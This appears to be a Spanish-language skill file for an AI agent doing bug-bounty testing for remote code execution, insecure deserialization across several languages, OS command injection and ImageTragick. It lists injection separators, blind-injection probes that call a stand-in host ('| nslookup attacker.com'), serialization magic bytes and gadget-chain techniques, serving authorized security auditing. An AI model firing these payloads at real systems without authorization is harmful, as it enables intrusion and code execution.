---
name: bug-bounty-rce-deserial
description: Identificación y explotación de Remote Code Execution (RCE), Insecure Deserialization (Java, PHP, Python, Node.js, Ruby), Command Injection y vulnerabilidades de procesamiento de archivos (ImageTragick).
---

# Skill: Remote Code Execution (RCE) & Deserialization

Esta habilidad capacita al agente para auditar aplicaciones web y servicios backend en búsqueda de fallos críticos de Ejecución Remota de Código (RCE), deserialización insegura de objetos y sanitización deficiente en llamadas a shell del sistema operativo (`exec`, `system`, `popen`, `child_process.exec`).

## 📌 Vectores Principales de RCE

### 1. Inyección de Comandos del Sistema Operativo (OS Command Injection)
- **Caracteres de separación de comandos**: `;`, `|`, `||`, `&`, `&&`, `%0a` (newline), `` `command` ``, `$(command)`.
- **Inyección Ciega (Blind Command Injection)**:
  - Verificar latencia: `| sleep 10`
  - Provocar consulta DNS: `| nslookup attacker.com` / `| ping -c 4 attacker.com`

### 2. Deserialización Insegura por Lenguaje
- **Java**:
  - Magic bytes: `rO0` (en Base64) / `AC ED 00 05` (Hex).
  - Gadgets conocidos: CommonsCollections, Spring, Groovy (Uso de `ysoserial`).
- **PHP**:
  - Funciones `unserialize()`. Formato string: `O:8:"User":2:{s:4:"name";...}`.
  - Abuso de Magic Methods (`__wakeup`, `__destruct`, `__toString`).
- **Python**:
  - `pickle.loads()`, `yaml.unsafe_load()`.
  - Creación de clases custom con el método `__reduce__` para ejecutar `os.system()`.
- **Node.js**:
  - `node-serialize` (`unserialize()`), `js-yaml` (versiones obsoletas).

### 3. Procesamiento Inseguro de Archivos (ImageTragick / File Parsing)
- **CVE-2016-3714 (ImageTragick)**: Archivos `.mvg`, `.svg` o `.png` manipulados enviados a librerías ImageMagick desactualizadas.

---

## 📚 Matriz de Vectores y Case Studies

Consulta la lista de gadgets y casos históricos en:
[rce-vector-matrix.md](file:///C:/Users/logir/.gemini/antigravity-ide/scratch/bug-bounty-skills/skills/bug-bounty-rce-deserial/references/rce-vector-matrix.md)
